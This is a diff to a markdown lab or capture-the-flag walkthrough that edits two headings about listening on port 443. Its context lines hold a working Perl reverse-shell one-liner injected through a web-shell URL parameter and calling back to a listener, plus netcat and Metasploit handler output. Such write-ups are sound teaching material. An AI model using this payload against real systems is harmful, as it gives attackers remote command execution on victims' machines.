@@ -106,6 +106,9 @@ Using a basic perl reverse shell (Generated from msfvenom)  // port 1234 , will 
 http://192.168.114.132/test/evil.php?cmd=192.168.114.132/test/test.php?cmd=/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 OR just use one of http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+##### Listen on port 443
+
 ```
 nc -lvp 443
 listening on [any] 443 ...
@@ -157,7 +160,7 @@ Using the same shell, we can get a root shell.
 
 WGET does not seem to work, so we upload through the same way in the previous section.
 
-#### Wait.
+#### Listen on Port 443 and Wait.
 Using msfconsole/exploit/multi/handler 
 ```
 Command shell session 5 opened (192.168.114.131:443 -> 192.168.114.132:37026) at 2018-03-02 18:16:55 +1100
